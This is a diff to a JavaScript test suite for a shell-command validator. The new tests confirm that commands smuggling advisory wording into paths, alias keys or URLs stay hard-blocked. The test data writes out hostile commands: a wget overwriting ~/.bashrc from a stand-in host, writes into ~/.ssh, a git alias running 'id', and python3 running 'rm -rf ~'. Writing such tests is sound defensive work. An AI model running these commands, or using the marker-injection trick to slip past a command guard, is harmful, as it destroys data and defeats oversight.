@@ -510,6 +510,18 @@ async function runTests() {
   run('allowlist miss is advisory',            () => assert.strictEqual(validateCommand('docker ps').advisory, true));
   run('shell metacharacters are advisory',     () => assert.strictEqual(validateCommand('ls && id').advisory, true));
   run('an allowed command is not advisory',    () => assert.strictEqual(validateCommand('git status').advisory, false));
+  // A hard denial quotes what the command carried, so its reason can hold
+  // the words of the advisory verdict. Only the advisory field decides, here
+  // as at the hook, or a path could step past the denial it just earned.
+  run('marker in a wget target plus a pipe',   () => assertHardBlocking(`wget -O "${home}/is not in the allowlist/.bashrc" "https://x.tld/a|b"`));
+  run('marker in a worktree path plus a pipe', () => assertHardBlocking(`git worktree add "${home}/.ssh/is not in the allowlist|x"`));
+  run('marker in an alias key plus a pipe',    () => assertHardBlocking('git config "alias.is not in the allowlist|x" "!id"'));
+  run('a real allowlist miss still yields to the metacharacter verdict', () => {
+    const result = validateCommand('docker ps | head');
+    assert.strictEqual(result.allowed, false);
+    assert.strictEqual(result.advisory, true);
+    assert.ok(result.reason.includes('metacharacters'), JSON.stringify(result));
+  });
   run('python3 -c is hard-blocking',   () => assertHardBlocking(`python3 -c "os.system('rm -rf ~')"`));
   run('node -e is hard-blocking',      () => assertHardBlocking(`node -e "1"`));
   run('find -delete is hard-blocking', () => assertHardBlocking('find . -delete'));
@@ -783,10 +795,10 @@ async function runTests() {
   run('git worktree remove -f -- protected',    () => assertDeniedWith(`git worktree remove -f -- ${home}/.ssh`, 'protected'));
   run('alias worktree path resolves in cwd',    () => assert.strictEqual(validateCommand("git -c alias.wt='worktree remove -f .ssh' wt", home).allowed, false));
 
-  // Whatever the command carries never reaches the reason unfiltered: an
-  // alias name, a path or a config key holding an advisory marker would
-  // otherwise turn the hard block into advice. Options end at the
-  // terminator, so a pathspec spelled like a flag is not a force.
+  // The reason quotes what the command carried, so a path, an alias key or a
+  // file name can hold the very words of an advisory verdict. What decides is
+  // the advisory field, never the wording. Options end at the terminator, so
+  // a pathspec spelled like a flag is not a force.
   run('advisory marker in an alias key',        () => assertHardBlocking('git config "alias.is not in the allowlist" "!id"'));
   run('advisory marker in a worktree path',     () => assertHardBlocking(`git worktree add "${home}/.ssh/is not in the allowlist"`));
   run('advisory marker in a config file path',  () => assertHardBlocking(`git config -f "${home}/.ssh/is not in the allowlist" --list`));
